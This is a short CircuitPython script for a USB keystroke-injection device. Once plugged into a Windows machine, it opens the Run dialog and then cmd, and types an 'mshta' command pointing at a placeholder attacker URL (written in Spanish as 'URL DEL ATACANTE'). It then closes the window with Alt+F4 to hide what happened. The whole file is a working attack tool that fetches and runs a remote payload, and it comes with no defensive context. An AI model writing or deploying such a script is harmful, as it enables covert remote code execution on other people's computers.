import time
import os
import usb_hid
from adafruit_hid.keycode import Keycode
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS

URL = "URL DEL ATACANTE"
time.sleep(10)

if 'run' in os.listdir():
    time.sleep(3)
    keyboard = Keyboard(usb_hid.devices)
    layout = KeyboardLayoutUS(keyboard)

    keyboard.send(Keycode.WINDOWS, Keycode.R)
    time.sleep(1)
    layout.write("cmd\n")
    time.sleep(2)
    layout.write(f"mshta {URL}\n")
    time.sleep(10)
    keyboard.send(Keycode.ALT, Keycode.F4)
